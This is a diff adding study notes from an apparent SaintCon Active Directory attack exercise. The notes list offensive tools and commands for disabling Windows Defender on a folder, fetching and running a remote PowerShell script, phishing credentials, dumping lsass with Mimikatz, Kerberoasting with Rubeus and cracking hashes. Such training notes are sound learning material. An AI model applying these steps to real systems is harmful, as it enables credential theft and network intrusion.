@@ -1,0 +1,62 @@
+SaintCon Exercise
+List of Tools / Prep - https://jmshake.com/SAINT22
+	• 7-zip
+	• Nmap
+	• Java JDK (Zulu)
+	• Sysinternals Suite
+	• Git for Windows
+	• Mimikatz
+	• BloodHound (includes Neo4j)
+	• SharpHound
+	• SharpMapExec
+	• Hashcat
+	• Visual Studio Community
+	• Python
+	• Invoke-CleverSpray
+	• Kerbrute
+	• Invoke-Kerberoast
+	• Rubeus
+	• Seatbelt
+	• SharpUp
+	• Gopher
+	• PowerStrip
+	• GoSecretsDump
+	• Purple Knight
+	• PingCastle
+
+1. Add Exception for Windows Defender: 
+   Add-MpPreference -ExclusionPath $env:UserProfile\Desktop
+
+Execute Script: 
+	Set-ExecutionPolicy Bypass -Scope Process -Force; iex ((New-Object System.Net.WebClient).DownloadString('https://jmshake.com/SAINT22/install-script-no-chocolatey.ps1'))
+
+Use GoPhisher to phish users credentials
+
+Run a powershell with the harvested credentials:
+	runas /netonly /user:vendinc.local\lgerg powershell.exe
+
+Test Creds
+	net view \\vendinc.local 
+	
+CleaverSpray - NTLM - Pulls a list of users for the domain and checks if the password was used previously for a user. Since Windows doesnt increment the number of bad passwords when the password was used previously, you can determine trends
+	
+Kerbroot - Feed usernames and will tell you if the user names exist
+
+lsass - create a dump from task manager and leverage mimikatz to harvest creds
+
+mimikatz - Very weird syntax that uses :: 
+	::sekurlsa::minidump
+	::sekurlsa::pth
+	
+Rubeus.exe - May have to compile on your own. It can be used for Kerberoasting. It leverages SPN that service accounts house
+	Rubeus.exe kerberoast /outfile:vi-kerberoast.txt
+	After, you can take the ticket and crack with either John or Hashcat + Wordlist
+	
+John the ripper uses CPU only
+	Rules - Best64 is a solid ruleset that wont take that much time
+Hashcast is superior but uses GPU. Doesnt perform well on VMs
+
+
+
+
+ 
